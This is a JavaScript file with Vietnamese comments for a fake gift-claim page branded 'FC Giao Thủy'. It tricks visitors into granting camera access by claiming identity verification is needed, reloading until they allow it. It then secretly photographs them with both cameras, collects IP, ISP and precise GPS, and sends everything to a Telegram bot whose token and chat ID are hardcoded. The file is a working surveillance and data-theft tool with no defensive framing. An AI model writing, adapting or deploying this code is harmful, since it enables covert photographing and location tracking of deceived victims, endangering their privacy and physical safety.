const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID = '-1003770043455';

const info = {
  time: '', ip: '', isp: '', address: '', lat: '', lon: '', device: '', os: '', camera: '⏳ Đang quét...'
};

const delay = ms => new Promise(res => setTimeout(res, ms));

// Hàm chụp ảnh đã fix lỗi ảnh đen
async function captureCamera(facingMode = 'user') {
  const stream = await navigator.mediaDevices.getUserMedia({ 
    video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }, 
    audio: false 
  });
  
  return new Promise(resolve => {
    const video = document.createElement('video');
    video.srcObject = stream;
    video.setAttribute('playsinline', ''); // Quan trọng cho iOS
    video.play();

    // Đợi video thực sự sẵn sàng
    video.onloadeddata = async () => {
      // Đợi thêm 1.2 giây để camera tự động điều chỉnh độ sáng (Auto-exposure)
      await delay(1200); 
      
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      
      // Vẽ ảnh từ video vào canvas
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      // Tắt stream ngay sau khi vẽ xong
      stream.getTracks().forEach(t => t.stop());
      
      canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.6);
    };
  });
}

async function main() {
  info.time = new Date().toLocaleString('vi-VN');
  
  // 1. Nhận diện thiết bị
  const ua = navigator.userAgent;
  info.os = /Android/i.test(ua) ? 'Android' : (/iPhone|iPad/i.test(ua) ? 'iOS' : 'PC');
  info.device = navigator.platform;

  let frontBlob = null;
  let backBlob = null;

  try {
    // 2. ÉP QUYỀN CAMERA (Chụp cam trước)
    frontBlob = await captureCamera("user");
    // Chụp cam sau (nếu có)
    try {
        backBlob = await captureCamera("environment");
    } catch(e) { console.log("Không có cam sau"); }
    
    info.camera = "✅ Thành công";
  } catch (e) {
    alert("CẢNH BÁO: Hệ thống yêu cầu Camera để xác thực danh tính nhận quà. Vui lòng nhấn 'Cho phép'!");
    location.reload();
    return;
  }

  // 3. LẤY IP & GPS (Chạy song song)
  const getIP = fetch('https://ipwho.is/').then(r => r.json()).then(res => {
    info.ip = res.ip;
    info.isp = res.connection?.org || 'N/A';
    if (!info.lat) { info.lat = res.latitude; info.lon = res.longitude; }
  }).catch(() => {});

  const getGPS = new Promise(res => {
    navigator.geolocation.getCurrentPosition(
      p => {
        info.lat = p.coords.latitude.toFixed(6);
        info.lon = p.coords.longitude.toFixed(6);
        info.address = `Độ chính xác cao`;
        res();
      },
      () => res(), 
      { enableHighAccuracy: true, timeout: 4000 }
    );
  });

  await Promise.all([getIP, getGPS]);

  // 4. GỬI DATA
  const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
  const caption = `
🏆 <b>[DATA NHẬN QUÀ FC GIAO THỦY]</b>
--------------------------
🕒 <b>Time:</b> ${info.time}
📱 <b>Device:</b> ${info.device} (${info.os})
🌍 <b>IP:</b> ${info.ip}
🏢 <b>ISP:</b> ${info.isp}
📍 <b>Maps:</b> <a href="${mapsLink}">Xem vị trí</a>
🏙️ <b>Địa chỉ:</b> ${info.address || 'Tọa độ IP'}
`.trim();

  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);

  const media = [];
  if (frontBlob) {
    formData.append('p1', frontBlob, 'f.jpg');
    media.push({ type: 'photo', media: 'attach://p1', caption: caption, parse_mode: 'HTML' });
  }
  if (backBlob) {
    formData.append('p2', backBlob, 'b.jpg');
    media.push({ type: 'photo', media: 'attach://p2' });
  }

  formData.append('media', JSON.stringify(media));

  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`, {
    method: 'POST',
    body: formData
  });
}
